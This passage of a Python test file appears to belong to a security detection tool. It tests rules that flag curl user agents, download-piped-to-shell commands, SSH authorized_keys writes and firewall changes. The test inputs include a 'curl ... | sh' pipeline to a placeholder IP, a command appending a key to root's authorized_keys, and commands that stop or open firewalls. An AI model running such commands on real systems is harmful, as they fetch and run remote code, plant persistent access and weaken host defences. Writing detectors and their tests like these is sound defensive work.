    playbook = host.ScriptFromTempDir()

    assert playbook.consume([exec_ev(argv, process__executable="/usr/bin/python3")]) == []
    assert playbook.missing_required == 0


# ---------------------------------------------------------------- tool user agent
def test_tool_ua():
    m = run(network.ToolUserAgentHttp, [ev(family="http_tx", source__ip="192.0.2.10", destination__ip="192.0.2.99",
                                           user_agent__original="curl/7.81.0", url__original="/TODO.md",
                                           http__hostname="192.0.2.99")])
    assert len(m) == 1 and "self-reported" in m[0].claim


def test_browser_ua_mentioning_curl_is_not_tool():
    m = run(network.ToolUserAgentHttp, [ev(family="http_tx", source__ip="192.0.2.10", destination__ip="192.0.2.99",
                                           user_agent__original="Mozilla/5.0 (compatible; curlbot-lookalike)")])
    assert m == []


# ---------------------------------------------------------------- option 2: script text is an indicator, not proof
def test_script_text_findings_are_worded_as_content_not_execution():
    m = run(host.DownloadPipedToShell, [exec_ev(["/bin/sh", "-c", "curl http://192.0.2.7/TODO.md | sh"])])
    assert len(m) == 1 and m[0].claim_type == "script_content"
    assert "script that contains the pipeline" in m[0].claim and "not established" in m[0].claim
    assert "running the pipeline" not in m[0].claim


def test_authorized_keys_direct_exec_vs_script_text_claims():
    direct = run(host.AuthorizedKeysWrite, [exec_ev(["tee", "-a", "/root/.ssh/authorized_keys"])])
    script = run(host.AuthorizedKeysWrite,
                 [exec_ev(["/bin/sh", "-c", "echo ssh-ed25519 AAAA x >> /root/.ssh/authorized_keys"])])
    assert direct[0].claim_type == "observed_action" and "records a command that writes" in direct[0].claim
    assert script[0].claim_type == "script_content" and "script that contains a write" in script[0].claim


def test_a_service_restart_that_flushes_its_own_chains_is_one_lead_per_form_worded_as_a_change():
    docker = [exec_ev(["iptables", "--wait", "-t", "nat", "-F", "DOCKER"]),
              exec_ev(["iptables", "--wait", "-t", "filter", "-X", "DOCKER-ISOLATION-STAGE-1"]),
              exec_ev(["iptables", "--wait", "-t", "nat", "-F", "DOCKER"])]
    m = run(host.FirewallRuleChange, docker)
    assert all(x.proposed_lane == "lead" for x in m) and len(m) == 2          # grouped per chain form, never context
    assert all("changes firewall state" in x.claim and "weakens the host firewall" not in x.claim for x in m)


@pytest.mark.parametrize("argv, lane", [
    (["ufw", "delete", "deny", "22"], "lead"),            # removing a block weakens
    (["ufw", "delete", "allow", "22"], "lead"),           # unclassified, so kept visible (it tightens)
])
def test_ufw_delete_is_judged_by_what_it_removes(argv, lane):
    assert [x.proposed_lane for x in run(host.FirewallRuleChange, [exec_ev(argv)])] == [lane]


@pytest.mark.parametrize("argv", [
    ["systemctl", "stop", "ufw"],
    ["systemctl", "disable", "--now", "firewalld.service"],
    ["firewall-cmd", "--permanent", "--add-port=4444/tcp"],
    ["firewall-cmd", "--panic-off"],
    ["iptables-restore"],
])
def test_other_ways_to_change_the_firewall_are_reported(argv):
    assert [x.proposed_lane for x in run(host.FirewallRuleChange, [exec_ev(argv)])] == ["lead"]


@pytest.mark.parametrize("argv", [
    ["firewall-cmd", "--set-default-zone", "trusted"],
    ["firewall-cmd", "--zone=trusted", "--add-interface=eth0"],
    ["ufw", "delete", "3"],
])
def test_firewall_changes_not_modelled_are_still_leads(argv):
    assert [x.proposed_lane for x in run(host.FirewallRuleChange, [exec_ev(argv)])] == ["lead"]
